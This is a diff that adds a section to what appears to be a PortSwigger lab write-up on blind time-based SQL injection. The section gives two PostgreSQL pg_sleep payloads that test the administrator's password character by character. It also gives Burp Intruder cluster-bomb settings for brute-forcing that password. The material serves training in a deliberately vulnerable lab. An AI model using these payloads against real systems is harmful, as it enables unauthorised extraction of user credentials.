@@ -90,6 +90,23 @@ From 20 onwards the Time delay is less than 10.So we can say that the length of 
 
 #### finding the password--
 
+```sql
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a')  THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
+```
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/29c51a3a-d7df-458e-afb4-c3c2dc21d484)
+
+Time delay of `729` which is less 10 sec. So condition is false which means that a is not the first charactor of the password.
+
+```To find the password send qury to  Intruder then and Add postion of password as payload1 and the string part as payload2 and select attack type as cluster bomb .Then go to  payload select payload1 type as numbers and set to 1 to 20 and select payload2 as  bruteforce set min and max =1  and also remove the default resource pool because it mess up with my time based sql injection code by adding create new resource pool and  tick the maximum concentration requests and set it as 1 and start attack. ```
+
+```sql
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$1$,1)='$a$')  THEN pg_sleep(10) ELSE pg_sleep(-1)END FROM users)--
+```
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/cb0dc217-0dd1-4346-b30c-32d38eb2dd19)
+
+
 
 
 
